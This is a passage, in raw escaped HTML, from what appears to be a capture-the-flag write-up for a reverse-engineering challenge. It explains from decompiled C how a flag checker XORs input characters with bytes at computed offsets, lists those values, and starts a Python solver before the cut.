&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    iVar2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wrong!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;LAB_00010914&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;((local_c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span&gt; __stack_chk_guard) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;__stack_chk_fail&lt;&#x2F;span&gt;&lt;span&gt;(iVar2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;local_c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span&gt; __stack_chk_guard&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The input character check was done using the following piece of code.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(local_1c4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; local_1c4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt; local_1c4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; local_1c4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;)(PTR_FUN_000210f4[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;)(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;DAT_00021040 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt; local_1c4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span&gt; abStack268[local_1c4])
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;(local_1c0[local_1c4] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xff&lt;&#x2F;span&gt;&lt;span&gt;)) {
&lt;&#x2F;span&gt;&lt;span&gt;        iVar2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wrong!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;goto&lt;&#x2F;span&gt;&lt;span&gt; LAB_00010914&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The predefined local_1c0 array elements are the target characters to which the input characters are expected to convert.&lt;&#x2F;p&gt;
&lt;p&gt;What actually happening is that the input &lt;strong&gt;character(abStack268[i])&lt;&#x2F;strong&gt; is XORed with the value available at the base address &lt;strong&gt;0x105ac&lt;&#x2F;strong&gt;. An offset array started from address &lt;strong&gt;00021040&lt;&#x2F;strong&gt; was taken as &lt;code&gt;*(00021040+(local_1c4 * 4))&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The offsets are as follows,&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;byu23&#x2F;byu23_chain.png&quot; alt=&quot;chain&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;offsets = [&amp;#39;0e&amp;#39;, &amp;#39;03&amp;#39;, &amp;#39;1c&amp;#39;, &amp;#39;13&amp;#39;, &amp;#39;17&amp;#39;, &amp;#39;21&amp;#39;, &amp;#39;12&amp;#39;, &amp;#39;04&amp;#39;, &amp;#39;27&amp;#39;, &amp;#39;09&amp;#39;, &amp;#39;0d&amp;#39;, &amp;#39;22&amp;#39;, &amp;#39;1e&amp;#39;, &amp;#39;15&amp;#39;, &amp;#39;0b&amp;#39;, &amp;#39;24&amp;#39;, &amp;#39;1d&amp;#39;, &amp;#39;0a&amp;#39;, &amp;#39;18&amp;#39;, &amp;#39;2b&amp;#39;, &amp;#39;19&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;1b&amp;#39;, &amp;#39;2a&amp;#39;, &amp;#39;08&amp;#39;, &amp;#39;1f&amp;#39;, &amp;#39;20&amp;#39;, &amp;#39;25&amp;#39;, &amp;#39;02&amp;#39;, &amp;#39;1a&amp;#39;, &amp;#39;0c&amp;#39;, &amp;#39;29&amp;#39;, &amp;#39;07&amp;#39;, &amp;#39;05&amp;#39;, &amp;#39;11&amp;#39;, &amp;#39;28&amp;#39;, &amp;#39;14&amp;#39;, &amp;#39;16&amp;#39;, &amp;#39;23&amp;#39;, &amp;#39;0f&amp;#39;, &amp;#39;01&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;2c&amp;#39;, &amp;#39;06&amp;#39;]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now these offsets are added to the base address &lt;strong&gt;0x105ac&lt;&#x2F;strong&gt; then accessed the value stored at that location and XORed it with input char.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;*(0x105ac + offsests[i]) ^ abStack268[i]&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The values started from &lt;code&gt;0x105ac&lt;&#x2F;code&gt; can be found here,&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;byu23&#x2F;byu23_chain1.png&quot; alt=&quot;chain&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Copying the values to a list can be handy to access with the offsets.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;data_at_105ac = [&amp;#39;24&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;9f&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;24&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;9f&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;41&amp;#39;, &amp;#39;e0&amp;#39;, &amp;#39;a3&amp;#39;, &amp;#39;1f&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e1&amp;#39;, &amp;#39;43&amp;#39;, &amp;#39;11&amp;#39;, &amp;#39;81&amp;#39;, &amp;#39;e0&amp;#39;, &amp;#39;c1&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;b0&amp;#39;, &amp;#39;e1&amp;#39;, &amp;#39;1e&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;2f&amp;#39;, &amp;#39;01&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;9f&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;53&amp;#39;, &amp;#39;e3&amp;#39;, &amp;#39;1e&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;2f&amp;#39;, &amp;#39;01&amp;#39;, &amp;#39;13&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;2f&amp;#39;, &amp;#39;e1&amp;#39;, &amp;#39;f8&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;02&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;f8&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;02&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;40&amp;#39;, &amp;#39;2d&amp;#39;, &amp;#39;e9&amp;#39;, &amp;#39;18&amp;#39;, &amp;#39;40&amp;#39;, &amp;#39;9f&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;d4&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;53&amp;#39;, &amp;#39;e3&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;80&amp;#39;, &amp;#39;bd&amp;#39;, &amp;#39;18&amp;#39;, &amp;#39;e0&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;eb&amp;#39;, &amp;#39;01&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e3&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;c4&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;80&amp;#39;, &amp;#39;bd&amp;#39;, &amp;#39;e8&amp;#39;, &amp;#39;08&amp;#39;, &amp;#39;11&amp;#39;, &amp;#39;02&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;e6&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;ea&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;48&amp;#39;, &amp;#39;2d&amp;#39;, &amp;#39;e9&amp;#39;, &amp;#39;04&amp;#39;, &amp;#39;b0&amp;#39;, &amp;#39;8d&amp;#39;, &amp;#39;e2&amp;#39;, &amp;#39;08&amp;#39;, &amp;#39;d0&amp;#39;, &amp;#39;4d&amp;#39;, &amp;#39;e2&amp;#39;, &amp;#39;6c&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;9f&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;93&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;08&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;0b&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e3&amp;#39;, &amp;#39;60&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;9f&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;93&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e3&amp;#39;, &amp;#39;03&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e1&amp;#39;, &amp;#39;99&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;eb&amp;#39;, &amp;#39;50&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;9f&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;93&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e3&amp;#39;, &amp;#39;03&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e1&amp;#39;, &amp;#39;94&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;eb&amp;#39;, &amp;#39;40&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;9f&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;93&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e3&amp;#39;, &amp;#39;03&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e1&amp;#39;, &amp;#39;8f&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;eb&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e1&amp;#39;, &amp;#39;1c&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;9f&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;20&amp;#39;, &amp;#39;93&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;08&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;1b&amp;#39;, &amp;#39;e5&amp;#39;, &amp;#39;02&amp;#39;, &amp;#39;20&amp;#39;, &amp;#39;33&amp;#39;, &amp;#39;e0&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;30&amp;#39;, &amp;#39;a0&amp;#39;, &amp;#39;e3&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;0a&amp;#39;, &amp;#39;90&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;ff&amp;#39;, &amp;#39;eb&amp;#39;, &amp;#39;04&amp;#39;, &amp;#39;d0&amp;#39;, &amp;#39;4b&amp;#39;, &amp;#39;e2&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;88&amp;#39;, &amp;#39;bd&amp;#39;, &amp;#39;e8&amp;#39;, &amp;#39;0c&amp;#39;, &amp;#39;0f&amp;#39;, &amp;#39;02&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;11&amp;#39;, &amp;#39;02&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;04&amp;#39;, &amp;#39;11&amp;#39;, &amp;#39;02&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;f8&amp;#39;, &amp;#39;10&amp;#39;, &amp;#39;02&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;00&amp;#39;, &amp;#39;48&amp;#39;, &amp;#39;2d&amp;#39;, &amp;#39;e9&amp;#39;, &amp;#39;04&amp;#39;, &amp;#39;b0&amp;#39;, &amp;#39;8d&amp;#39;, &amp;#39;e2&amp;#39;, &amp;#39;07&amp;#39;, &amp;#39;dd&amp;#39;, &amp;#39;4d&amp;#39;, &amp;#39;e2&amp;#39;, &amp;#39;88&amp;#39;, &amp;#39;32&amp;#39;, &amp;#39;9f&amp;#39;, &amp;#39;e5&amp;#39;]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So, if the flag character can be recovered by XORing the &lt;strong&gt;Constant&lt;&#x2F;strong&gt; from the base address and the &lt;strong&gt;Predefined array&lt;&#x2F;strong&gt; values.&lt;&#x2F;p&gt;
&lt;p&gt;Here is the solution script to print flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;local_1c0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;44
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc2
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9c
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x65
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x83
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x95
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x66
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xfa
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x15
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5e
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x58
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2f
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x23
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xac
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;13&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4f
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;14&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa1
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;15&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4c
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7d
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1e
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x69
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;19&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8c
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;21&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4a
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;22&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x26
&lt;&#x2F;span&gt;&lt;span&gt;local_1c0[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;23&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5b
